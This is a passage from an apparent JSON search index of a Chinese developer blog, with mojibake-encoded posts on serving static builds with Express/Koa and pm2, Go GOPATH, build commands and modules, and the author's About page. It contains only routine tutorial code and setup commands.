fs.readFileSync(path.resolve(__dirname, \u0026#39;./dist/index.html\u0026#39;), \u0026#39;utf-8\u0026#39;) res.send(html) }) //å¯åŠ¨webæœåŠ¡å™¨ app.listen(8888, res =\u0026gt; { console.log(chalk.yellow(\u0026#39;Start Service On 8888\u0026#39;)) }) å¯ç”¨\n$ node server.js // æˆ–pm2 server.js é€šè¿‡ localhost:8888 è®¿é—®å…¶ç›®å½•ä¸‹buildå¥½ /dist é™æ€èµ„æº\n2.koa2 æ­å»ºæœ¬åœ°æœåŠ¡å™¨å‚è€ƒï¼šhttps://blog.csdn.net/Smile_666666/article/details/107269299\nå®‰è£…\n$ npm install -g koa $ koa2 --version $ npm install koa-static -S server.js\n// app.js const Koa = require(\u0026#39;koa\u0026#39;) //åˆ›å»ºwebæœåŠ¡å™¨ const app = (module.exports = new Koa()) // const chalk = require(\u0026#39;chalk\u0026#39;) //æ‰˜ç®¡é™æ€èµ„æº app.use(require(\u0026#39;koa-static\u0026#39;)(__dirname + \u0026#39;/dist\u0026#39;)) //å¯åŠ¨webæœåŠ¡å™¨ app.listen(8888, res =\u0026gt; { // console.log(chalk.yellow(\u0026#39;Start Service On 8888\u0026#39;)) console.log(\u0026#39;Start Service on 8888!\u0026#39;) }) å¯ç”¨\n$ node server.js // æˆ–pm2 server.js é€šè¿‡ localhost:8888 è®¿é—®å…¶ç›®å½•ä¸‹buildå¥½ /dist é™æ€èµ„æº\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-pm2/","summary":"ä¸€ã€ç¯å¢ƒé…ç½® centOS å®‰è£… node \u0026amp; é…ç½®å…¨å±€å˜é‡ 1.centos å®‰è£… node æ³¨æ„ï¼šå®‰è£…å’Œé…ç½®è¿‡","title":"Node: pm2ç®¡ç†NodeæœåŠ¡å¯åŠ¨é™æ€buildæ‰“åŒ…æ–‡ä»¶"},{"content":"ä»‹ç»åŒ…çš„ç›¸å…³æ¦‚å¿µä»¥åŠä½¿ç”¨æ–¹æ³•\u0026hellip;\nåœ¨golangä¸­ï¼Œæ‰€æœ‰æºæ–‡ä»¶éƒ½å±äºä¸€ä¸ªåŒ…ï¼Œgolangçš„åŒ…å…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š\nåŒ…å¯ä»¥è¢«å…¶ä»–åŒ…å¼•ç”¨ æ¯ä¸ªgolangç¨‹åºåªæœ‰ä¸€ä¸ªmainåŒ… åŒ…çš„ä¸»è¦ç”¨é€”æ˜¯æé«˜ä»£ç çš„å¯å¤ç”¨æ€§ ä¸€ã€GOPATHç¯å¢ƒå˜é‡ 1.ä»€ä¹ˆæ˜¯GOPATHï¼Ÿ golangåŒ…çš„ä½¿ç”¨ä¾èµ–ä¸€ä¸ªé‡è¦çš„ç¯å¢ƒå˜é‡ï¼šGOPATHï¼Œæ— è®ºæ˜¯è‡ªå·±çš„ä»£ç è¿˜æ˜¯ç¬¬ä¸‰æ–¹ä»£ç ï¼Œéƒ½ä»¥GOPATHä½œä¸ºå·¥ä½œç›®å½•å’Œä¸€å¥—å®Œæ•´çš„å·¥ç¨‹ç›®å½•è§„åˆ™ã€‚GOPATHç›®å½•çº¦å®šæœ‰ä¸‰ä¸ªå­ç›®å½•ï¼Œä¸»è¦ç”¨äº:\nsrcï¼šå­˜æ”¾å„ç§åŒ…æºä»£ç ï¼Œsrcé‡Œçš„ä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªåŒ… pkgï¼šå­˜æ”¾ç¼–è¯‘æºä»£ç åçš„ç±»åº“ binï¼šå­˜æ”¾ç¼–è¯‘æºä»£ç åçš„å¯æ‰§è¡Œç¨‹åº GOPATHå…è®¸å¤šä¸ªç›®å½•ï¼Œè®¾ç½®å¤šä¸ªç›®å½•æ—¶ï¼Œéœ€è¦ä½¿ç”¨ç¯å¢ƒå˜é‡åˆ†éš”ç¬¦æ¥åŒºåˆ†ã€‚Unix/Linuxçš„ç¯å¢ƒå˜é‡åˆ†éš”ç¬¦æ˜¯è‹±æ–‡è¾“å…¥æ³•ä¸‹çš„å†’å·:ï¼Œwindowsçš„ç¯å¢ƒå˜é‡åˆ†éš”ç¬¦æ˜¯è‹±æ–‡åˆ†å·;\nä½¿ç”¨GOPATHæ—¶ï¼Œgolangä¼šåœ¨ä»¥ä¸‹ç›®å½•ä¸­æœç´¢åŒ…ï¼š\nGOROOT/srcï¼šè¯¥ç›®å½•ä¿å­˜äº†Goæ ‡å‡†åº“é‡Œä»£ç  GOPATH/srcï¼šè¯¥ç›®å½•ä¿å­˜äº†åº”ç”¨è‡ªèº«çš„ä»£ç å’Œç¬¬ä¸‰æ–¹ä¾èµ–çš„ä»£ç  2.è®¾ç½®GOPATHç¯å¢ƒå˜é‡ åœ¨Unix/Linuxä¸­ï¼Œä½¿ç”¨sudo vim/etc/profileæ‰“å¼€ç³»ç»Ÿprofileæ–‡ä»¶ï¼Œå¹¶è¿½åŠ ä»¥ä¸‹å†…å®¹è®¾ç½®GOPATHç¯å¢ƒå˜é‡ï¼ŒåŒæ—¶è®¾ç½®GO111MODULEä¸ºå…³é—­çŠ¶æ€ï¼ŒGO111MODULEç¯å¢ƒå˜é‡æˆ‘ä»¬åœ¨æ–‡ç« ä¸­åé¢éƒ¨åˆ†è¯´æ˜\n$ export GOPATH=/Users/pan/go # æŠŠè‡ªå·±çš„golangé¡¹ç›®ç›®å½•ä½œä¸ºGOPATHçš„å˜é‡ $ export GO111MODULE=off # å…³é—­golang 11.1 ç‰ˆæœ¬ä»¥åçš„æ¨¡å—åŠŸèƒ½ ä½¿ç”¨source /etc/profileå‘½ä»¤é‡æ–°åŠ è½½ç¯å¢ƒå˜é‡\n3.åŒ…çš„ä½¿ç”¨ 3.1 mainåŒ…ä¸åŒ…çš„å¼•å…¥ å¼•å…¥ç³»ç»ŸåŒ… æˆ‘ä»¬å¯ä»¥é€šè¿‡packageå…³é”®å­—å®šä¹‰ä¸€ä¸ªåŒ…ï¼Œä½¿ç”¨importå¼•å…¥å…¶ä»–åŒ…ï¼Œå¦‚æœéœ€è¦å¼•å…¥å¤šä¸ªåŒ…ï¼Œå¯ä»¥å°†å„ä¸ªåŒ…å£°æ˜åœ¨æ‹¬å·å†…\npackage main import ( // å¼•å…¥ç³»ç»Ÿçš„åŒ… \u0026#34;fmt\u0026#34; ) func main() { // è°ƒç”¨ç³»ç»ŸåŒ…çš„å‡½æ•° fmt.Println(\u0026#34;Hello World\u0026#34;) } åœ¨ä»¥ä¸Šä»£ç ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡mainå…³é”®å­—å®šä¹‰äº†mainåŒ…ï¼Œä¸»å‡½æ•°mainå¿…é¡»ä½äºmainåŒ…ä¸‹ã€‚ç¨‹åºä¸­å¼•å…¥äº†fmtåŒ…ï¼Œè¯¥åŒ…ç”±golangæœ¬èº«æä¾›ã€‚\nå¼•å…¥è‡ªå®šä¹‰åŒ… æˆ‘ä»¬åœ¨GOPATH/srcç›®å½•ä¸‹åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶: æ–‡ä»¶1ï¼Œåº“æ–‡ä»¶ä½äºjkdev.cn/test/mypkg/lib.goï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç \npackage mypkg import \u0026#34;fmt\u0026#34; func TestFunc() { fmt.Println(\u0026#34;call testFunc\u0026#34;) } æ–‡ä»¶2ï¼Œä¸»æ–‡ä»¶jkdev.cn/test/main.goï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç \npackage main // å¼•å…¥è‡ªå®šä¹‰åŒ… import \u0026#34;jkdev.cn/test/mypkg\u0026#34; func main() { // è°ƒç”¨è‡ªå®šä¹‰åŒ…çš„å‡½æ•° mypkg.TestFunc() } è‡ªå®šä¹‰çš„åŒ…ç”±æˆ‘ä»¬è‡ªå·±å®šä¹‰ï¼Œä½†è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€ä¸ªç›®å½•å¯¹åº”ä¸€ä¸ªåŒ…ï¼ŒåŒæ—¶ï¼ŒåŒ…ååº”å½“å’Œç›®å½•åä¸€è‡´ã€‚å¼•å…¥åŒ…æ—¶ï¼Œè·¯å¾„ç›¸å¯¹åº”GOPATH/srcï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è‡ªå·±çš„ç¨‹åºçš„åŠŸèƒ½æ¨¡å—åˆ’åˆ†ä¸åŒçš„åŒ…\n3.2 åŒ…çš„ä½œç”¨åŸŸ åŒ…å†…ï¼šåœ¨åŒä¸€ä¸ªåŒ…å†…å®šä¹‰çš„å‡½æ•°ã€å˜é‡ã€å¸¸é‡ã€ç»“æ„ä½“ï¼Œå¯ä»¥è¢«åŒ…å†…çš„æ‰€æœ‰å…¶ä»–ä»£ç ä»»æ„è®¿é—®ï¼Œå®ƒä»¬å±äºåŒ…å†…å…¬å¼€ã€‚ åŒ…å¤–ï¼šå¦‚æœå‡½æ•°ã€å˜é‡ã€å¸¸é‡ã€ç»“æ„ä½“ä½äºä¸åŒçš„åŒ…ä¸‹ï¼Œå¦‚æœå°†å®ƒä»¬çš„é¦–å­—æ¯ä½¿ç”¨å¤§å†™æ ‡è¯†ï¼Œè¡¨ç¤ºå®ƒä»¬æ˜¯å…¬å¼€è®¿é—®çš„ã€‚å¯¹äºç»“æ„ä½“å­—æ®µã€‚å¦‚æœæƒ³è¦åœ¨åŒ…å¤–è¿›è¡Œè®¿é—®ï¼Œè¿˜è¦è®©ç»“æ„ä½“å­—æ®µå˜é‡åä½¿ç”¨é¦–å­—æ¯å¤§å†™ã€‚ äºŒã€ç¼–è¯‘ golangä¸­go buildå‘½ä»¤ä¸»è¦ç”¨äºç¼–è¯‘ä»£ç ã€‚åœ¨åŒ…çš„ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œè‹¥æœ‰å¿…è¦ï¼Œä¼šåŒæ—¶ç¼–è¯‘ä¸ä¹‹ç›¸å…³è”çš„åŒ…ã€‚\nå‡è®¾æˆ‘ä»¬çš„è®¾ç½®GOPATHæ˜¯/Users/pan/goï¼Œæˆ‘ä»¬åœ¨GOPATHä¹‹ä¸‹çš„srcåˆ›å»ºåˆ›å»ºä»£ç testç›®å½•ï¼Œå¹¶æ·»åŠ lib.goå’Œmain.goä¸¤ä¸ªæ–‡ä»¶ã€‚æ­¤æ—¶ï¼Œæºæ–‡ä»¶ç›¸å¯¹äºGOPATHçš„è·¯å¾„å¦‚ä¸‹ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªgoæºæ–‡ä»¶è¿›è¡Œç¼–è¯‘\ngo GOPATHç›®å½• â”œâ”€src æºç ç›®å½• â”‚ â”œâ”€test é¡¹ç›®ç›®å½• â”‚ â”œâ”€lib.go å…¬å…±å‡½æ•°æ–‡ä»¶ â”‚ â””â”€main.go ä¸»å‡½æ•°æ–‡ä»¶ lib.goä»£ç å¦‚ä¸‹ï¼š\npackage main import \u0026#34;fmt\u0026#34; func testFunc() { fmt.Println(\u0026#34;call testFunc\u0026#34;) } main.goä»£ç å¦‚ä¸‹ï¼š\npackage main func main() { testFunc() } ç¤ºä¾‹ä¸­çš„ä¸¤ä¸ªæºæ–‡ä»¶éƒ½å±äºmainåŒ…ï¼Œæ‰€ä»¥åœ¨main.goæ–‡ä»¶ä¸­èƒ½æ­£å¸¸å¼•å…¥lib.goæ–‡ä»¶\n1.go build 1.1 æ— å‚æ•°ç¼–è¯‘ æ— å‚æ•°ç¼–è¯‘ä¸ä¾èµ–GOPATHï¼Œéœ€è¦åœ¨æºç ç›®å½•ä¸‹è¿›è¡Œç¼–è¯‘\n# è¿›å…¥æºç ç›®å½• $ cd ~/go/src/test # ç¼–è¯‘ä»£ç  $ go build æˆ‘ä»¬è¿˜å¯ä»¥-oæŒ‡å®šç¼–è¯‘åè¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶åï¼Œå¦‚ä¸‹\n$ go build -o main 1.2 go build æ–‡ä»¶åˆ—è¡¨ ä½¿ç”¨â€œgo build+æ–‡ä»¶åˆ—è¡¨â€ç¼–è¯‘æ—¶ï¼Œæ–‡ä»¶åˆ—è¡¨ä¸­çš„æ¯ä¸ªæ–‡ä»¶å¿…é¡»æ˜¯åŒä¸€ä¸ªåŒ…çš„Goæºç \n# è¿›å…¥æºç ç›®å½• $ cd ~/go/src/test # ç¼–è¯‘ $ go build lib.go main.go 1.3 go build åŒ… åŒ…çš„è·¯å¾„ç›¸å¯¹äºGOPATHï¼Œâ€œgo build+åŒ…â€ç¼–è¯‘æ—¶ï¼Œæºæ–‡ä»¶éœ€è¦å­˜æ”¾åœ¨GOPATH/srcä¸‹çš„è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„æœ‰è¯»å†™æƒé™çš„ç›®å½•æ‰§è¡Œç¼–è¯‘å‘½ä»¤ï¼Œå¦‚ä¸‹\n# test ç›¸å¯¹äºGOPATH/src $ go build test 2.go install ä¸go buildå…·æœ‰ç›¸ä¼¼åŠŸèƒ½çš„æ˜¯go installå‘½ä»¤ï¼Œgo installç”¨æ¥ç”Ÿæˆåº“å’Œå·¥å…·å¹¶å­˜æ”¾äºGOPATHä¸­ã€‚\nä¸€æ˜¯ç¼–è¯‘åŒ…æ–‡ä»¶ï¼ˆæ— mainåŒ…ï¼‰ï¼Œå°†ç¼–è¯‘åçš„åŒ…æ–‡ä»¶æ”¾åˆ°pkgç›®å½•ä¸‹ï¼ˆGOPATH/pkgï¼‰ã€‚ äºŒæ˜¯ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆæœ‰mainåŒ…ï¼‰ï¼Œå°†å¯æ‰§è¡Œæ–‡ä»¶æ”¾åˆ° binç›®å½•ï¼ˆGOPATH/binï¼‰ 3.go build å’Œ go install å¯¹æ¯” ç›¸åŒç‚¹ï¼š\néƒ½èƒ½ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ ä¸åŒç‚¹ï¼š\n\u0026amp; åŒ…æ–‡ä»¶ å¯æ‰§è¡Œæ–‡ä»¶ç›®å½• go build ä¸èƒ½ç”ŸæˆåŒ…æ–‡ä»¶ ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹ go install å¯ä»¥ç”ŸæˆåŒ…æ–‡ä»¶ ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶åœ¨binç›®å½•ä¸‹($GOPATH/bin) ä¸‰ã€Goæ¨¡å— golangåœ¨1.11ç‰ˆæœ¬å¼•å…¥Go Modulesï¼Œä¹Ÿå«åšGoæ¨¡å—ï¼Œæ¨¡å—ä¾èµ–äºä¸Šæ–‡æåˆ°çš„GO111MODULEç¯å¢ƒå˜é‡ã€‚å®ƒæ˜¯golangå®˜æ–¹æä¾›çš„åŒ…ç®¡ç†å·¥å…·ï¼Œé€šè¿‡Go Modulesï¼Œæˆ‘ä»¬å¯ä»¥ä¸å¿…å°†é¡¹ç›®æ”¾åœ¨GOPATHä¸Š\n1.GO111MODULEç¯å¢ƒå˜é‡ ç”¨ç¯å¢ƒå˜é‡GO111MODULEè®¾ç½®å¼€å¯æˆ–è€…å…³é—­æ¨¡å—æ”¯æŒï¼Œå®ƒæœ‰ä¸‰ä¸ªå¯é€‰å€¼ï¼šoffã€onã€autoï¼Œé»˜è®¤æ˜¯auto\nGO111MODULE=offï¼šæ— æ¨¡å—æ”¯æŒï¼Œgoä¼šä»GOPATHå¯»æ‰¾åŒ…ã€‚ GO111MODULE=onï¼šæ¨¡å—æ”¯æŒï¼Œæ ¹æ®go.modæ–‡ä»¶ä¸‹è½½ä¾èµ– GO111MODULE=autoï¼šåœ¨$GOPATH/srcå¤–é¢ä¸”é¡¹ç›®æ ¹ç›®å½•æœ‰go.modæ–‡ä»¶æ—¶ï¼Œè‡ªåŠ¨å¼€å¯æ¨¡å—æ”¯æŒ åœ¨ä½¿ç”¨æ¨¡å—çš„æ—¶å€™ï¼ŒGOPATHæ˜¯æ— æ„ä¹‰çš„ï¼Œä½†golangè¿˜æ˜¯ä¼šæŠŠä¸‹è½½çš„ä¾èµ–å­˜å‚¨äºGOPATHä¹‹ä¸‹\nGO111MODULEé…ç½®å‚è€ƒ Goå¸¸ç”¨å‘½ä»¤ç¤ºä¾‹ | Gitee\n2.ä½¿ç”¨goæ¨¡å— ä½¿ç”¨Go Modulesæ—¶ï¼Œæˆ‘ä»¬å…ˆå°†GO111MODULEè®¾ç½®ä¸ºonæˆ–è€…autoï¼ŒGo Moduleså’ŒGOPATHä¸åŒï¼Œä¸éœ€è¦åŒ…å«å›ºå®šçš„ä¸‰ä¸ªå­—ç›®å½•ã€‚ä¸€ä¸ªç©ºçš„æºä»£ç ç›®å½•ï¼Œåªè¦åˆå§‹åŒ–å¥½go.modæ–‡ä»¶ï¼Œå°±å¯ä»¥å®šä¹‰ä¸€ä¸ªModuleã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„Module\n# åˆ›å»ºä¸€ä¸ªç©ºçš„å·¥ä½œç›®å½• mkdir -p ~/Work/go/test # è¿›å…¥å·¥ä½œç›®å½• cd ~/Work/go/test # åˆå§‹åŒ–ä¸€ä¸ªmodule go mod init testmodule æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è‡ªåŠ¨ç”Ÿæˆçš„go.modæ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹\nmodule testmodule go 1.16 2.1 ä¸‹è½½ä¾èµ– Go Modulesä¼šä¸ºæˆ‘ä»¬è¿›è¡ŒåŒ…ç®¡ç†ï¼Œå¹¶è‡ªåŠ¨æ›´æ–°go.modæ–‡ä»¶ï¼Œå¦‚æœéœ€è¦å¼•å…¥æ–°çš„ä¾èµ–ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ç»ˆç«¯æ‰§è¡Œgo get åŒ…åå³å¯å¼•å…¥ç¬¬ä¸‰æ–¹åŒ…ï¼Œå¦‚\n$ go get github.com/satori/go.uuid æ‰§è¡Œå‘½ä»¤åï¼ŒGo Modulesä¼šä»æˆ‘ä»¬åœ¨å®‰è£…golangæ—¶è®¾ç½®çš„GOPROXYé•œåƒä»“åº“åœ°å€å»ä¸‹è½½å¯¹åº”çš„åŒ…ï¼Œå®‰è£…å®Œæˆä¹‹åæˆ‘ä»¬çœ‹åˆ°go.modå·²ç»å‘ç”Ÿå˜åŒ–ï¼Œå¦‚ä¸‹\n$ module testmodule go 1.16 require github.com/satori/go.uuid v1.2.0 # indirect æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆç¼–è¾‘å¥½go.modæ–‡ä»¶ï¼Œç„¶ååœ¨ç»ˆç«¯ä½¿ç”¨go mod downloadï¼Œgolangä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬ä¸‹è½½ä¾èµ–åŒ…åˆ°æœ¬åœ°ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦å¼•å…¥å¤šä¸ªåŒ…ï¼Œå°†æ‰€æœ‰åŒ…åå¸è½½æ‹¬å·å†…ï¼Œå¦‚ä¸‹ä»£ç \nmodule testmodule go 1.16 require ( github.com/satori/go.uuid v1.2.0 // indirect gorm.io/gorm v1.21.11 // indirect ) 2.2 æ›´æ–°ä¾èµ–å…³ç³» ä½¿ç”¨go mod tidyæ›´æ–°ä¾èµ–å…³ç³»ï¼Œè¯¥å‘½ä»¤æ‹‰å–ç¼ºå°‘çš„æ¨¡å—ï¼Œç§»é™¤ä¸ç”¨çš„æ¨¡å—ã€‚Go Moduleså¯ä»¥è½»æ˜“åœ°è¿›è¡Œä¸€ä¸ªåŒ…çš„ä¾èµ–ç®¡ç†å’Œç‰ˆæœ¬æ§åˆ¶ï¼Œgo buildå’Œgo installå°†è‡ªåŠ¨ä½¿ç”¨go.modä¸­çš„ä¾èµ–å…³ç³»ï¼Œå‡å°‘äº†GOPATHç®¡ç†æ—¶çš„å¤æ‚æ€§\nå››ã€å¸¸è§é…ç½®é”™è¯¯ 1ã€å¯¼å…¥éæ ‡å‡†åº“ å¼€å‘ä¸­ï¼Œæƒ³ä½¿ç”¨ä¸€ä¸ªã€ä¸æ˜¯æ ‡å‡†åº“moduleã€‘çš„å†…å®¹ï¼Œè¿™ä¸ªåº“å¯èƒ½æ˜¯æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„utilå·¥å…·æˆ–è€…å…¶ä»–å…¬å…±ä¸šåŠ¡çš„æŠ½ç¦»å°è£…ç­‰ã€‚\néæ ‡å‡†åº“ä¸åœ¨GOROOTé‡Œ(ä¸€èˆ¬æˆ‘ä»¬ä¸ä¼šä¿®æ”¹GOROOTä¸­çš„å†…å®¹)\nä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³å¯¼å…¥ä¸Šå›¾ä¸­myUtilsåŒ…ï¼Œè¿è¡Œgo run xxxå¸¸ä¼šé‡åˆ°ä»¥ä¸‹é”™è¯¯æç¤ºï¼š\nmain.go:5:2: cannot find package \u0026#34;package_xxx\u0026#34; in any of: /usr/local/go/src/package_xxx (from $GOROOT) /Users/lianpf/go/src/package_xxx (from $GOPATH) è§£å†³æ–¹å¼æœ‰ä¸¤ç§ï¼š\nè®¾ç½®GOPATH + GO111MODULE=off ä½¿ç”¨go.modä¸”goç‰ˆæœ¬å¤§äº13 1.1 è®¾ç½®GOPATH + GO111MODULE=off å‰æï¼šè®¾ç½®GOPATHï¼Œä¿éšœä¸Šå›¾ä¸­go_packageé¡¹ç›®åœ¨$GOPATH/srcå¼€å‘ã€‚ è®¾ç½®ï¼šGO111MODULE=off åŸç†ï¼šgoçš„ç¼–è¯‘å™¨ä¼šåœ¨$GOPATH/srcä¸‹é¢å¯»æ‰¾å¯¹åº”çš„æ¨¡å—ï¼Œsrcä¸‹çš„æ¯ä¸€ä¸ªç›®å½•éƒ½å¯å¯¹åº”ä¸€ä¸ªæ¨¡å—ï¼Œç›®å½•ä¸­çš„ç›®å½•ä¹Ÿå¯æ˜¯ä¸€ä¸ªæ¨¡å—ã€‚\næ‰€ä»¥ï¼Œå½“æˆ‘ä»¬éœ€è¦è®¿é—®æ¨¡å—myUtilsæ—¶ï¼Œåªéœ€è¦ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š\nimport ( \u0026#34;fmt\u0026#34; \u0026#34;go_package/myUtils\u0026#34; // $GOPATH/srcå±‚çº§ä¸‹çš„ç›®å½•ç»“æ„ ) 1.2 ä½¿ç”¨go.modä¸”goç‰ˆæœ¬å¤§äº13 åœ¨Golang1.11ç‰ˆæœ¬å‰ï¼Œè‡ªå®šä¹‰åŒ…å¿…é¡»æŠŠé¡¹ç›®æ”¾åœ¨GOPATHç›®å½•ã€‚Go1.11ç‰ˆæœ¬åä½¿ç”¨go modç®¡ç†é¡¹ç›®ï¼Œä¸éœ€è¦éå¾—æŠŠé¡¹ç›®æ”¾åˆ°GOPATHæŒ‡å®šç›®å½•ä¸‹ã€‚Go1.13åå¯ä»¥å½»åº•ä¸è¦GOPATHäº†\nè¿™é‡Œè®¾ç½®ï¼šGO111MODULE=on\nç¬¬ä¸€æ­¥ï¼šåˆå§‹åŒ–ä¸€ä¸ªgo.mod\n# go_package å¯ä»¥æ˜¯ä»»æ„çš„åç§°(å»ºè®®å’Œé¡¹ç›®ç›®å½•åä¿æŒä¸€è‡´) $ go mod init go_package go.modæ–‡ä»¶ç¤ºä¾‹ï¼š\nç¬¬äºŒæ­¥ï¼šå¼•å…¥æ¨¡å—myUtilsï¼Œä»¥go_package(å³ä¸Šä¸€æ­¥åˆå§‹åŒ–å®šä¹‰çš„package name)å¼€å¤´ï¼Œåæ¥æ¨¡å—è·¯å¾„ã€‚ç¤ºä¾‹ï¼š\nimport ( \u0026#34;fmt\u0026#34; \u0026#34;go_package/myUtils\u0026#34; // go_packageæ˜¯ä¸Šä¸€æ­¥åˆå§‹åŒ–å®šä¹‰çš„package name ) è¿è¡Œï¼ŒæŸ¥çœ‹æ•ˆæœã€‚\nå‚è€ƒ goè¯­è¨€ä¸­åŒ…çš„ä½¿ç”¨.æ˜é‡‘ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-env-compile-modules/","summary":"\u003cp\u003eä»‹ç»åŒ…çš„ç›¸å…³æ¦‚å¿µä»¥åŠä½¿ç”¨æ–¹æ³•\u0026hellip;\u003c/p\u003e","title":"Go: ç¯å¢ƒå˜é‡ã€ç¼–è¯‘å’Œæ¨¡å—"},{"content":"æ¬¢è¿æ¥åˆ° æ›œçµ çš„ä¸ªäººåšå®¢ã€‚\nåšä¸»ç›®å‰å°±èŒäºXé›†å›¢ä¸Šæµ·ç ”å‘ä¸­å¿ƒ-å¹³å°å·¥å…·ç»„ï¼Œæ˜¯ä¸€åè½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆã€‚ä¸»è¦æ¶‰åŠåˆ°å¦‚ä¸‹æŠ€æœ¯é¢†åŸŸï¼š\nè®¡ç®—æœºåŸºç¡€ï¼ˆè®¾è®¡æ¨¡å¼ã€ç®—æ³•ã€è®¡ç®—æœºç½‘ç»œã€æµè§ˆå™¨åŸç†ï¼‰ ReactæŠ€æœ¯æ ˆ \u0026amp; VueæŠ€æœ¯æ ˆ Hybrid å·¥ç¨‹åŒ–ï¼ˆwebpack/viteæ„å»ºæ‰“åŒ…ã€nodeè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼‰ Node BFFå±‚ç›¸å…³ Go Webç¼–ç¨‹ å·¥ä½œä¹‹ä½™ï¼Œä¸€ç›´åœ¨å…¬å…±çš„é¢†åŸŸä¸ºç¤¾åŒºå°½äº›ç»µè–„ä¹‹åŠ›ï¼Œç°æœ‰è‹¥å¹²ç‹¬ç«‹çš„å¼€æºé¡¹ç›®ï¼š\nreact PC ç»„ä»¶åº“react-pc-ui è„šæ‰‹æ¶ï¼šé€‰æ‹© template å¿«é€Ÿæ­å»º webpack + react + vueé¡¹ç›® @lianpf/create-app-cli Monaco Editorï¼šå¾®è½¯å¼€æºé¡¹ç›® monaco-editor äºŒæ¬¡å°è£…Vueç‰ˆ @lianpf/monaco-editor-vue Nodeæ¡†æ¶ï¼šåŸºäºKoa2å’ŒEggçš„Apr å¸Œæœ›å’Œå¤§å®¶ä¸€èµ·æˆé•¿ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è”ç³»åšä¸»ï¼š\ngitHub: lianpf å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—… çŸ¥ä¹ï¼šæ›œçµ é‚®ç®±ï¼šwanderlian@outlook.com æœ€åï¼Œæ¬¢è¿å¤§å®¶å…³æ³¨åšä¸»çš„å¾®ä¿¡å…¬ä¼—å·ï¼Œè·å–æœ€æ–°æ–‡ç« çš„è¾“å‡ºä¿¡æ¯ã€‚åŒæ—¶ä¹Ÿæ¬¢è¿å°ä¼™ä¼´ä»¬ï¼Œé€šè¿‡å¾®ä¿¡å…¬ä¼—å·è·å–ã€åšä¸»å¾®ä¿¡ã€‘æŠ•ç¨¿ï¼Œæ–‡ç« å†…å®¹ä¸å±€é™äºæŠ€æœ¯ï¼\n","permalink":"https://lianpf.github.io/about/","summary":"æ¬¢è¿æ¥åˆ° æ›œçµ çš„ä¸ªäººåšå®¢ã€‚ åšä¸»ç›®å‰å°±èŒäºXé›†å›¢ä¸Šæµ·ç ”å‘ä¸­å¿ƒ-å¹³","title":"ğŸ™‹ğŸ»â€â™‚ï¸å…³äºæˆ‘"},{"content":"æ¸²æŸ“æµæ°´çº¿ä¸­ï¼ŒDOMæ ‘æœ¬èº«çš„ç¼ºé™·å¾ˆå®¹æ˜“å¼•èµ·é‡æ’ã€é‡ç»˜ç­‰æ€§èƒ½é—®é¢˜ï¼Œåæ¥æœ‰äº†è™šæ‹ŸDOMçš„\u0026hellip;\nä¸€ã€DOMæ ‘ 1ã€èŠä¸€ä¸‹DOM 